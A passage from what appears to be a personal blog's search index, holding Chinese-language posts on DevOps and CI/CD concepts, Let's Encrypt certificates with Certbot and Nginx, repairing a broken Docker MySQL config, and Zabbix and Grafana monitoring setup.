            
            <tag> Xdebug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是DevOps、CI、CD、K8S</title>
      <link href="/what-is-devops-ci-cd-k8s/"/>
      <url>/what-is-devops-ci-cd-k8s/</url>
      
        <content type="html"><![CDATA[<p>之所以要写这片笔记，是因为前段时间在使用 gitlab 提交代码时，遇到了点问题。</p><p>gitlab 提示我 commit 失败。跟进了一下，并没有找到答案。</p><a id="more"></a><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200914094145.png" alt=""></p><p>只是了解到一个叫做 <code>CI/CD</code>的东西。后来又延伸扩展到<code>DevOps</code>、<code>K8S</code> 这些新概念。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200914094211.png" alt=""></p><h2 id="什么是-DevOps？"><a href="#什么是-DevOps？" class="headerlink" title="什么是 DevOps？"></a>什么是 DevOps？</h2><p>如题，什么是 DevOps ？根据字面意思理解就是：<code>Dev</code> + <code>Ops</code>，开发（Development）和运营（Operations）这两个领域的合并。</p><p>就我个人的理解，它是一个概念、一种思维，是一种通力合作，共同解决问题的方式。</p><p>这里我就不追根溯源去解释为什么要合并开发和运营了，因为历史原因，总是存在着这样的问题。具体看参考链接一。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200914094228.png" alt=""></p><p>DevOps 也不仅仅是一种软件的部署方法。它通过一种全新的方式，来思考如何让软件的作者（开发部门）和运营者（运营部门）进行合作与协同。使用了DevOps模型之后，会使两个部门更好的交互。<br>其中，<code>自动化部署</code>的概念就是从中产生的。</p><h2 id="什么是-CI-CD？"><a href="#什么是-CI-CD？" class="headerlink" title="什么是 CI/CD？"></a>什么是 CI/CD？</h2><p>Gitlab 的<code>CI/CD</code>到底是什么呢？</p><p>昨天大致了解了下 <code>Gitlab CI/CD</code>，不是很明白，但觉得很厉害。<br>首先来看下官方文档的简介：</p><blockquote><p>软件开发的连续方法基于自动执行脚本，以最大限度地减少在开发应用程序时引入错误的可能性。从新代码的开发到部署，它们需要较少的人为干预甚至根本不需要干预。<br>它涉及在每次小迭代中不断构建，测试和部署代码更改，从而减少基于有缺陷或失败的先前版本开发新代码的机会。</p></blockquote><p>这里有三种主要的方法，根据最适合你的策略进行选择。</p><h3 id="持续集成"><a href="#持续集成" class="headerlink" title="持续集成"></a>持续集成</h3><p>考虑一个应用程序，其代码存储在Gitlab中的存储库中。开发人员每天多次推送代码更改，对于每次推动到存储库，都可以创建一组脚本来自动构建和测试应用程序，从而减少向应用程序引入错误的可能性。这种方法被称为：<strong>持续集成（Continuous Integration）</strong></p><h3 id="持续交付"><a href="#持续交付" class="headerlink" title="持续交付"></a>持续交付</h3><p><strong>持续交付 Continuous Delivery</strong>是持续集成的一个步骤，应用程序不仅在推送到代码库的每个代码更改时都构建和测试，而且作为一个额外的步骤，它也会连续部署，尽管部署是手动触发的。</p><h3 id="持续部署"><a href="#持续部署" class="headerlink" title="持续部署"></a>持续部署</h3><p><strong>持续部署 Continuous Deployment</strong>也是持续集成的又一步，类似于持续交付。不同之处在于，不必手动部署应用程序，而是将其设置为自动部署。完全不需要人工干预就可以部署应用程序。</p><h2 id="什么是-K8S？"><a href="#什么是-K8S？" class="headerlink" title="什么是 K8S？"></a>什么是 K8S？</h2><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://blog.csdn.net/bjweimengshu/article/details/79031552" target="_blank" rel="noopener">什么是DevOps？–程序员小灰</a></li><li><a href="https://www.cnblogs.com/servicehot/p/6510199.html" target="_blank" rel="noopener">DevOps 到底是什么？</a></li><li><a href="https://docs.gitlab.com/ee/ci/introduction/index.html" target="_blank" rel="noopener">使用GitLab介绍CI / CD</a></li><li><a href="http://www.ttlsa.com/auto/gitlab-cicd-quick-start/" target="_blank" rel="noopener">Gitlab CI/CD 快速入门</a></li><li><a href="https://docs.gitlab.com/ee/ci/quick_start/README.html" target="_blank" rel="noopener">Gitlab CI/CD 入门</a></li><li><a href="https://docs.gitlab.com/ee/ci/README.html" target="_blank" rel="noopener">Gitlab CI 示例</a></li><li><a href="https://docs.gitlab.com/ee/ci/docker/README.html" target="_blank" rel="noopener">Docker 集成</a></li><li><a href="https://docs.gitlab.com/runner/" target="_blank" rel="noopener">Git Runner 是什么？</a></li><li><a href="https://docs.gitlab.com/runner/install/" target="_blank" rel="noopener">安装Gitlab Runner</a></li><li><a href="https://docs.gitlab.com/ee/topics/autodevops/index.html" target="_blank" rel="noopener">什么是 Auto DevOps</a></li><li><a href="https://zhuanlan.zhihu.com/p/29232090" target="_blank" rel="noopener">K8S 是什么？知乎</a></li><li><a href="https://zhuanlan.zhihu.com/p/33640916" target="_blank" rel="noopener">为什么 K8S 很酷</a></li><li><a href="https://github.com/rootsongjc/kubernetes-handbook" target="_blank" rel="noopener">K8S 中文指南</a></li><li><a href="https://zhuanlan.zhihu.com/p/28810342" target="_blank" rel="noopener">一文了解 K8S 是什么？</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DevOps </tag>
            
            <tag> K8S </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何自动申请免费的SSL 证书</title>
      <link href="/how-to-automatically-apply-for-a-free-ssl-certificate/"/>
      <url>/how-to-automatically-apply-for-a-free-ssl-certificate/</url>
      
        <content type="html"><![CDATA[<p>上次介绍了如何通过第三方网站申请免费的SSL 证书，但有效期只有三个月，三个月之后又需要再次申请，记得还好，如果忘了可能还会造成不必要的损失。</p><a id="more"></a><p><a href="https://letsencrypt.org/" target="_blank" rel="noopener">Let’s Encrypt</a> 是一个免费提供的SSL 证书的CA，虽然每次签发的有效期都只有三个月，但是发证是自动化的，发证速度较快，并且可以通过脚本来自动续签，为个人网站使用HTTPS提供了一个不错的选择。</p><p>Let’s Encrypt （以下简称LE）的证书签发主要使用基于 ACME协议 的证书自动管理客户端来实现。</p><p>LE官方推荐的客户端是 <a href="https://certbot.eff.org/" target="_blank" rel="noopener">Certbot</a> ，本文中就是使用 Certbot 来获取和续签证书。</p><h2 id="LE-是如何自动签发证书的"><a href="#LE-是如何自动签发证书的" class="headerlink" title="LE 是如何自动签发证书的"></a>LE 是如何自动签发证书的</h2><p>假设现在要申请CA 证书的域名是 <code>example.com</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200911120519.png" alt=""></p><p>首先由WebServer（也就是我们用户端的服务器）的管理客户端（如Certbot）发送请求到LE，让LE来验证客户端是否真的控制example.com这个域名，接下来LE会提出一些验证动作（原文challenges），比如让客户端在一个很明显的路径上放指定的文件。同时，LE还会发出一个随机数，客户端需要用这个随机数和客户端自己的私钥来进行签名。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200911120904.png" alt=""></p><p>WebServer上的客户端完成LE指定的域名验证动作并且将加密后的签名后，再次发送请求到LE要求验证，LE会验证发回来的签名是否正确，并且验证域名验证动作是否完成，如下载指定的文件并且判断文件里面的内容是否符合要求。</p><p>这些验证都完成以后，可以申请证书了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200911120943.png" alt=""></p><p>完成验证后，客户端生成自己的私钥以及 <a href="https://tools.ietf.org/html/rfc2986" target="_blank" rel="noopener">Certificate Signing Request（CSR）</a> 发送到LE服务器，LE服务器会将CA证书（也是公钥）发放到你的服务器。</p><p>这样就完成了CA证书的自动化发放了。</p><h3 id="使用Certbot-获取证书"><a href="#使用Certbot-获取证书" class="headerlink" title="使用Certbot 获取证书"></a>使用Certbot 获取证书</h3><p>LE 的CA 证书发放原理看着还挺麻烦的，但如果使用 Certbot 客户端，整个过程还是挺简单的。</p><p>在正式获取证书之前，推荐先去<a href="https://certbot.eff.org/instructions" target="_blank" rel="noopener">Certbot 官网</a>选择适合自己的系统环境。</p><p>我这边系统环境是<code>Nginx</code> + <code>Ubuntu 18.04 LTS</code>，所以下面介绍的安装流程只适用于<strong>Ubuntu + Nginx</strong>。</p><h4 id="1-安装-snap"><a href="#1-安装-snap" class="headerlink" title="1. 安装 snap"></a>1. 安装 snap</h4><p><a href="https://zh.wikipedia.org/zh-hans/Snappy_(%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8)" target="_blank" rel="noopener">snap</a> 是Canonical公司发布的全新的软件包管理方式，它类似一个容器拥有一个应用程序所有的文件和库，各个应用程序之间完全独立。使用snap 包的好处就是它解决了应用程序之间的依赖问题，使应用程序之间更容易管理。但是由此带来的问题就是它占用更多的磁盘空间。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt update</span><br><span class="line">$ sudo apt install snapd</span><br></pre></td></tr></table></figure><h4 id="2-安装-certbot"><a href="#2-安装-certbot" class="headerlink" title="2. 安装 certbot"></a>2. 安装 certbot</h4><p>在安装 Certbot 之前，最好先移除历史快照。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get remove certbot</span><br></pre></td></tr></table></figure><p>进行安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo snap install --classic certbot</span><br></pre></td></tr></table></figure><h4 id="3-生成证书"><a href="#3-生成证书" class="headerlink" title="3. 生成证书"></a>3. 生成证书</h4><p>安装完成之后，下一步需要做的就是生成证书了，这里有两种方式：</p><ol><li><p>生成证书并自动配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo certbot --nginx</span><br></pre></td></tr></table></figure></li><li><p>生成证书手动配置</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo certbot certonly --nginx</span><br></pre></td></tr></table></figure><p>我选择的是手动配置，大概流程如下：</p><ol><li>输入常用邮箱，用来接收通知和恢复密钥。</li><li>同意使用协议。</li><li>输入需要做授权的域名，多个域名用空格隔开。</li><li>等待验证通过。</li></ol><p>需要注意的是：</p><ol><li><code>certbot</code>会自动检测本地Nginx 的可用域名（没有配置server_name 的域名不会被检测到）</li><li>如果其中某个域名验证失败，则不会生成密钥及证书</li></ol><p>一切正常的话，可以看到<code>/etc/letsencrypt/live/your_sites/</code>目录下多了四个文件：</p><ul><li><code>cert.pem</code> ： 公钥，服务器证书</li><li><code>chain.pem</code> ： 中间证书</li><li><code>fullchain.pem</code> ： 前两个的合集</li><li><code>privkey.pem</code> ： 私钥</li></ul><p>其中配置Nginx SSL 只需要用到<code>fullchain.pem</code> 和<code>privkey.pem</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       443 ssl;</span><br><span class="line">    server_name www.example.com;</span><br><span class="line"></span><br><span class="line">    ssl on;</span><br><span class="line">    ssl_certificate &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;www.exampl.com&#x2F;fullchain.pem;</span><br><span class="line">    ssl_certificate_key &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;www.example.com&#x2F;privkey.pem;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，就已经完成了生成证书到配置的全部过程了。</p><h3 id="自动续签"><a href="#自动续签" class="headerlink" title="自动续签"></a>自动续签</h3><p>如果快要到期了，可以使用<code>certbot renew</code>对证书进行更新，需要注意的是，如果证书尚未过期，则不会更新。</p><p>可以配合<code>conrtab</code>使用，每半个月的凌晨三点自动续签一次。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ 0 3 15 * * certbot renew</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://blog.cngal.org/index.php?controller=post&action=view&id_post=10" target="_blank" rel="noopener">Let’s Encrypt免费SSL证书获取以及自动续签</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTPS </tag>
            
            <tag> SSL </tag>
            
            <tag> HTTP </tag>
            
            <tag> Certbot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>当 Docker 容器无法正常启动时如何修改配置文件</title>
      <link href="/how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally-1/"/>
      <url>/how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally-1/</url>
      
        <content type="html"><![CDATA[<p>在容器无法正常启动的情况下，如何修改其配置文件？</p><p>问题描述：因为错误的配置文件导致容器运行异常，无法正常启动，通常情况下只有进入容器才能修改配置文件，所以在不能进入容器的情况下该怎么办呢？</p><a id="more"></a><p>这种情况下，有两种方式去修改：<br>2. Docker 容器的配置文件一般在 <code>/var/lib/docker/overlay/</code>目录下，可以找到该目录下对应的配置文件进行修改。<br>2. 把容器中的配置文件复制到主机中，修改完之后，再移动到容器中。</p><h2 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h2><ol><li><p>查询日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker logs &lt;容器名称&#x2F;容器id&gt;</span><br><span class="line"></span><br><span class="line">ERROR: mysqld failed while attempting to check config</span><br><span class="line">command was: &quot;mysqld --verbose --help&quot;</span><br><span class="line">2020-09-03T12:15:54.644699Z 0 [ERROR] unknown variable &#39;realy-log&#x3D;slave-relay-bin&#39;</span><br><span class="line">2020-09-03T12:15:54.650119Z 0 [ERROR] Aborting</span><br></pre></td></tr></table></figure><p>由于异常日志可以得知是因为我将<code>relay-log</code> 写成了 <code>realy</code> 导致容器无法正常启动。</p></li><li><p>查找文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ find &#x2F; -name mysqld.cnf</span><br><span class="line"></span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;merged&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;4f128d7fb1200f722b0d2cfe3606149fe72987a7a16bc78551a2b1fe6c6c6572&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;a68f1af4adf982b037f1bd37d61082fde1fa2b0e26ea0e2fe146edcb69b198ea&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure><p>这里可能会出现多个配置文件，这是因为每一次重启Mysql 容器都会保留一个配置文件，所以理论上，直接修改第一个配置文件，就是当前Mysql 所使用的配置文件。</p></li><li><p>修改配置文件</p></li><li><p>重启容器即可。</p></li></ol><h2 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h2><p>如果第一种方式没生效，那可以尝试第二种方式。</p><ol><li><p>复制容器中的配置文件到主机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 语法：docker cp &lt;容器名称&#x2F;容器id&gt;:&lt;配置文件在容器中的路径&gt; &lt;需要复制到主机的路径&gt;</span><br><span class="line"></span><br><span class="line">$ docker cp mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf ~&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure></li><li><p>修改主机中的配置文件</p></li><li><p>将该配置文件mv 到容器中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 语法：docker cp &lt;配置文件在主机中的路径&gt; &lt;容器名称&#x2F;容器id&gt;:&lt;配置文件在容器中的路径&gt;</span><br><span class="line"></span><br><span class="line">$ docker cp ~&#x2F;mysqld.cnf mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure></li><li><p>重启配置文件即可。</p></li></ol><p>总结：两种方式均可以有效解决上述问题，当然这类方式仅适用于容器是因错误的配置文件导致无法正常启动的情况。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/LinHenk/article/details/88111616" target="_blank" rel="noopener">Docker修改无法启动的容器的配置文件</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zabbix 快速上手——添加监控项</title>
      <link href="/zabbix-quick-start-add-monitoring-items/"/>
      <url>/zabbix-quick-start-add-monitoring-items/</url>
      
        <content type="html"><![CDATA[<p>在Zabbix 默认的监控项中，唯独没有网络状态的监控，而网络状况的监控又是我最关心的，所以需要自己手动添加。</p><p>下面介绍的方式仅适合主机数量不多的情况手动添加，如果主机数量很多，使用这种方式会很繁琐低效。</p><a id="more"></a><p>至于更好的方式是怎样的，暂时还没有发现。</p><h2 id="添加监控项"><a href="#添加监控项" class="headerlink" title="添加监控项"></a>添加监控项</h2><p>打开<code>Configuration-&gt;Hosts</code> 主机页面，点击需要监控项的主机的 <code>Application</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908202935.png" alt=""></p><p>在<code>Application</code>列表中，如果没有看到 <code>Network interfaces</code>这一项，那么可以点击右上角的<code>Create Appliction</code>自己创建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908203206.png" alt=""></p><p>创建完成之后，<code>items</code> 默认是没有的，需要我们自己添加，继续点击<code>items-&gt;create items</code>。</p><p>接下来是最重要的一步，添加监控项的具体信息。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908203720.png" alt=""></p><p>需要注意的地方有下面几个：</p><ul><li>Name：自定义该项监控的名称</li><li>Key：<code>net.if.in[eth0,bytes]</code>，其中<code>eth0</code>并不是固定的，这个具体的值是被监控得主机得实际网卡。</li><li>Units：<code>bps</code></li><li>Update interval：自动更新时间，这个可以自定义。</li><li>Applications：选择 <code>Network interfaces</code></li></ul><blockquote><p>如何确定网卡地址？</p></blockquote><p>进入服务器，输入<code>ifconfig</code>命令查看，通常排在最前面得就是实际网卡。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908205948.png" alt=""></p><p>完成之后，点击<code>Add</code>添加监控项。</p><p>如果一切顺利的话，可以在刚才添加的监控项列表中看到监控项状态是启用的。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908204614.png" alt=""></p><p>这个时候已经可以看到该监控项相关的数据了，如果希望在Grafana 中展示，那么只需要在选择Application时，选择<code>Network interfaces</code>就好了。</p><p>结合Grafana，最后的效果大概是这样：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908205451.png" alt=""></p><p>这里只是举了一个典型的例子来了解Zabbix 如何手动添加监控项，其他类型的数据也是通过类似的方式进行添加。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/smail-bao/p/6109882.html" target="_blank" rel="noopener">zabbix监控网络的出入口流量</a></li><li><a href="https://pdf-lib.org/Home/Details/3901" target="_blank" rel="noopener">Cannot find information for this network interface in /proc/net/dev</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Zabbix </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Zabbix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zabbix + Grafana 打造高颜值的分布式监控平台</title>
      <link href="/zabbix-grafana-to-create-a-high-value-distributed-monitoring-platform/"/>
      <url>/zabbix-grafana-to-create-a-high-value-distributed-monitoring-platform/</url>
      
        <content type="html"><![CDATA[<p>在前面了解了如何部署 Zabbix，众所周知Zabbix 的部署并不是难的部分，配置才是最难的那部分。</p><p>所以如何获取到想要的那部分数据，将那部分数据以更直观的方式展现出来，这才是我们更关心的。</p><p>Zabbix 默认有自己的 Graphs，但是并不好用，所以使用Zabbix + Grafana 打造高颜值的分布式监控平台才是最好的选择。</p><a id="more"></a><h2 id="Grafana-是什么？"><a href="#Grafana-是什么？" class="headerlink" title="Grafana 是什么？"></a>Grafana 是什么？</h2><blockquote><p>Grafana是一个跨平台的开源度量分析和可是化的工具，可以通过该将采集的数据查询然后可视化的展示，并及时通知。</p></blockquote><p>Grafana 有以下特点：</p><ol><li>展示方式：快速灵活的客户端图表，面板插件有许多不同方式的可视化指标和日志，官方库中具有丰富的仪表盘插件，比如热图、折线图、图表等多种展示方式.</li><li>数据源：Graphite、InfluxDB、OpenTSDB、Prometheus、Elasticsearch、CloudWatch和KairosDb、Zabbix等。</li><li>通知提醒：以可视方式定义最重要指标的报警规则，Grafana将不断计算并发送通知，在数据达到预设阈值时通过slack，PagerDuty等处理通知。</li><li>混合展示：在同一图表中混合使用不同的数据源，可以基于每个查询指定数据源，甚至自定义数据源。</li><li>注释：使用来自不同数据源的丰富事件来展示图表，将鼠标悬停在事件上会显示完整的事件元数据和标记。</li><li>过滤器：Ad-hoc过滤器允许动态创建新的键/值过滤器，这些过滤器会自动应用于使用该数据源的所有查询。</li></ol><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Grafana 的安装还是建议根据自己实际的系统环境去<a href="https://grafana.com/grafana/download/7.0.0" target="_blank" rel="noopener">官网</a>选择适合自己的下载链接。</p><p>比如我的环境是 Ubuntu 18.04，我想安装 Grafana 7.0，所以我的安装方式应该是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install -y adduser libfontconfig1</span><br><span class="line">$ wget https:&#x2F;&#x2F;dl.grafana.com&#x2F;oss&#x2F;release&#x2F;grafana_7.0.0_amd64.deb</span><br><span class="line">$ sudo dpkg -i grafana_7.0.0_amd64.deb</span><br></pre></td></tr></table></figure><h3 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h3><p>以守护进程的方式启动 <code>grafana-server</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo systemctl daemon-reload</span><br><span class="line">$ sudo systemctl start grafana-server</span><br></pre></td></tr></table></figure><p>设置开机启动：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo systemctl enable grafana-server.service</span><br></pre></td></tr></table></figure><p>查看 <code>grafana-server</code>所监听的端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo netstat -lntp</span><br><span class="line">tcp6       0      0 :::3000                 :::*                    LISTEN      17194&#x2F;grafana-serve</span><br></pre></td></tr></table></figure><p>3000 是Grafana 默认监听端口，然后通过浏览器访问 <code>http://your_ip_address:3000</code> 即可。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200907174006.png" alt=""></p><p>正常应该可以看到该页面，如果你能看到3000 端口被监听，但是页面一直打不开，那可能是因为防火墙没有允许3000 端口。</p><p>默认的用户名和密码都是：admin，登录之后记得第一时间修改默认密码。</p><h3 id="安装Zabbix-插件"><a href="#安装Zabbix-插件" class="headerlink" title="安装Zabbix 插件"></a>安装Zabbix 插件</h3><p>打开Grafana 的插件列表，找到<a href="https://grafana.com/grafana/plugins/alexanderzobnin-zabbix-app" target="_blank" rel="noopener">Zabbix</a>。</p><p>这里根据实实际情况，选择对应的版本。</p><p>通过<code>grafana-cli</code> 安装zabbix 插件，将下面这行代码放在安装了 Grafana 的服务器上执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ grafana-cli plugins install alexanderzobnin-zabbix-app</span><br><span class="line">✔ Installed alexanderzobnin-zabbix-app successfully</span><br></pre></td></tr></table></figure><p>安装完成之后，重启Grafana：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo systemctl restart grafana-server</span><br></pre></td></tr></table></figure><p>然后打开Grafana 的Web 界面，在插件列表中找到 Zabbix。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200907175149.png" alt=""></p><p>点击启用。</p><h3 id="add-data-source"><a href="#add-data-source" class="headerlink" title="add data source"></a>add data source</h3><p>自从 Grafana 7.0 以后，没有签名的插件默认在 datasource 中是不可见的…</p><p>坑啊，最初我安装的是 Zabbix5.0，然后看见Grafana 7.0 好像只适配4.0，心想完了，该不会出现什么版本不兼容的问题吧？</p><p>结果在<code>add data source</code>这一步，一直找不到 zabbix…</p><p>然后今天把5.0 完全卸载了，重新装回了4.0，结果到了<code>add data source</code>这一步才发现，还是找不到zabbix，当时心态就崩了…</p><p>直到我看见<a href="https://sbcode.net/zabbix/grafana-zabbix-plugin/" target="_blank" rel="noopener">这篇文章</a>，这么重要的信息，官方文档中居然没记录。</p><p>如果你无法访问，也可以直接进行修改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;grafana&#x2F;grafana.ini</span><br><span class="line"></span><br><span class="line"># 添加一行</span><br><span class="line">allow_loading_unsigned_plugins &#x3D; alexanderzobnin-zabbix-datasource</span><br></pre></td></tr></table></figure><p>然后重启Grafana：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo systemctl restart grafana-server</span><br></pre></td></tr></table></figure><p>再次打开Web 页面，现在就能找到 Zabbix 了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200907181658.png" alt=""></p><h3 id="配置-data-source"><a href="#配置-data-source" class="headerlink" title="配置 data source"></a>配置 data source</h3><p>只用修改以下四个地方就好了，然后点击保存。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200907203549.png" alt=""></p><h3 id="add-dashboard"><a href="#add-dashboard" class="headerlink" title="add dashboard"></a>add dashboard</h3><p>依次点击<code>add dashboard-&gt; add new panel</code>，然后按照以下方式配置，就可以选择展示自己想要的数据了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200907204758.png" alt=""></p><p>最后的效果：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200907204326.png" alt=""></p><p>这里只是介绍了 Zabbix + Grafana 最基础的用法，能看到的数据也是最简单的一些，如果想看到更多的数据，那就得更加了解 Zabbix 了。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Zabbix </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Zabbix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>当 Docker 容器无法正常启动时如何修改配置文件？</title>
      <link href="/how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally/"/>
      <url>/how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally/</url>
      
